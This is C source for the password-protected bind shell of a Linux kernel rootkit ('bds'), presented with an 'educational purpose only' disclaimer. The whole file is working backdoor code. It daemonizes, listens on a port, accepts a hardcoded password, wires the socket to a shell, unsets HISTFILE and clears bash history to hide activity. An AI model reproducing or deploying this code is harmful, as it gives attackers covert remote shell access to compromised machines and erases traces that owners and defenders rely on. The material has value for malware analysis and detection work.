/*
bind shell for bds lkm rootkit

developed by : Antonius (Antonius Robotsoft)

website : www.bluedragonsec.com

github : https://github.com/bluedragonsecurity

Simple Stable LKM Rootkit for linux kernel 5.x and 6.x
to install rootkit, read readme.txt !

Warning!! This rootkit is for educational purpouse only! I am not       
responsible to anything you do with this !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*

*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/file.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <errno.h>
#include "bds_userspace_functions.h"
#include "bds_vars.h"

#ifndef SOL_SOCKET 
#define SOL_SOCKET      1
#endif

#ifndef  SO_REUSEADDR 
#define SO_REUSEADDR    2
#endif

int main()
{
	int sock, result, sin_size = 0;  
        struct sockaddr_in server_addr;   
	struct sockaddr_in client_addr;    	
	static const uint8_t BACKLOG = 4;
	int res = 0;
	char *ask_password = "Password :";
	char buf[17];
	char *wrong_passwd = "Wrong password";
        
	system("killall -9 bds_br");
	system("kill -9 31337");
        daemonize(bind_pid);
        
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
            fprintf(stdout,"Socket error  ! exit ! \n");
            return 1;
        }
	server_addr.sin_family = AF_INET;         
        server_addr.sin_port = htons(bind_port);     
        server_addr.sin_addr.s_addr = INADDR_ANY; 
        bzero(&(server_addr.sin_zero), 8); 
        if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) < 0) {
            printf("setsockopt(SO_REUSEADDR) failed");
        }
        if (setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &(int){1}, sizeof(int)) < 0) {
            printf("setsockopt(SO_REUSEPORT) failed");
        }
        if ((sock = fcntl_nonblock(sock)) < 0) {
            printf("failed to set non blocking sock");
        }
        if (bind(sock, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
            printf("Error code: %d\n", errno);
            fprintf(stdout,"Bind failed ! exit ! \n");
            exit(-1);
        }
        if (listen(sock, BACKLOG) == -1) {
            fprintf(stdout,"Listen failed ! exit ! \n");
            exit(-1);
        }
        
        while(1) { 
		if ((result  = accept(sock, (struct sockaddr *)&client_addr,(socklen_t * __restrict__)(&sin_size))) >= 0) {
			write(result, ask_password, strlen(ask_password));
			res = read(result, buf, sizeof(buf));
			if (res > 0) {
				if ((strcmp(buf, bindshell_password) == 0) || (strstr(buf, bindshell_password) != NULL)) {
					dup2(result,2);
					dup2(result,1);
					dup2(result,0);
					system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
					system("unset HISTFILE");
					system("bash -c 'history -c'");
					system("uname -a");
					system("/bin/bash");
					close(result);	
				}
				else {
					send(result, wrong_passwd, strlen(wrong_passwd), MSG_NOSIGNAL);
					close(result);
				}				
			}
		}
	}
	printf("\n");
	
	return 0;
}
